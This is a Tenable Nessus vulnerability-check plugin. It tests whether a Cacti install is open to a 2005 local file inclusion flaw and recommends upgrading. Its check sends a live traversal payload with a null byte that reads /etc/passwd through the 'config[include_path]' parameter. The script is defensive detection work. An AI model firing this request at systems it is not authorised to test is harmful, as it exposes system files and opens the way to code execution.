#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(18546);
  script_version("$Revision: 1.27 $");
  script_cvs_date("$Date: 2015/03/03 18:58:53 $");

  script_cve_id("CVE-2005-1524", "CVE-2005-1525", "CVE-2005-1526");
  script_bugtraq_id(14027, 14028, 14030, 14042, 14128, 14129);
  script_osvdb_id(17424, 17425, 17426, 17539);

  script_name(english:"Cacti Local File Inclusion Vulnerability");
  script_summary(english:"Checks for a local file inclusion vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is running a PHP application that is affected by
a local file inclusion vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Cacti application running on the remote web server is affected by
a local file inclusion vulnerability due to improperly validating
user-supplied input to the 'config[include_path]' parameter in
'config_settings.php'. A remote attacker can exploit this to execute
arbitrary PHP code.");
  script_set_attribute(attribute:"see_also", value:"http://www.cacti.net/release_notes_0_8_6e.php");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/403174/30/0/threaded");
  script_set_attribute(attribute:"solution", value:"Upgrade to Cacti 0.8.6e or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Cacti graph_view.php Remote Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/06/22");
  script_set_attribute(attribute:"patch_publication_date", value:"2005/06/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/06/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:cacti:cacti");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencies("cacti_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/cacti");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

get_install_count(app_name:'cacti', exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);
install = get_install_from_kb(appname:'cacti', port:port, exit_on_fail:TRUE);


  # Try to exploit one of the file include flaws.
  dir = install['dir'];
  r = http_send_recv3(
    method:"GET",
    port: port,
    item:string(dir, "/include/config_settings.php?", "config[include_path]=/etc/passwd%00"),
    exit_on_fail:TRUE
  );

  res = r[2];

  # There's a problem if we get the password file.
  if (egrep(string:res, pattern:"root:.+:0:[01]:")) {
    security_hole(port);
    exit(0);
  }
  else audit(AUDIT_WEB_APP_NOT_AFFECTED, 'Cacti', build_url(qs:dir, port:port));
